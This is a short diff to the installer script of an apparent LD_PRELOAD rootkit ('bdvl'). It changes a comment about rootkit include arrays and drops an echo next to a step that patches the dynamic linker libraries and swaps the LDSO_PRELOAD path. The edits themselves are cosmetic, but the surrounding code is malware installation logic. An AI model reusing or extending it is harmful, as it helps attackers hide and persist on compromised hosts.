@@ -26,7 +26,7 @@ source ./etc/toggles.sh
 source ./etc/headers.sh
 
 # functions responsible for locating & writing
-# xor'd arrays within rootkit include directories.
+# arrays within rootkit include directories.
 source ./etc/arrays.sh
 
 # the functions within this script handle setting up
@@ -88,7 +88,7 @@ install_bdvl(){
     wecho "Make sure any essential dependencies are present."
     wecho "You can install them with '$0 -D'"
 
-    local response="$(show_yesno "Patch dynamic linker libs?")"; echo
+    local response="$(show_yesno "Patch dynamic linker libs?")"
     if [ $response == 0 ]; then
         necho "Patching dynamic linker libraries, please wait..."
         LDSO_PRELOAD="`etc/patch_libdl.sh -op | tail -n 1`"   # change default LDSO_PRELOAD to new
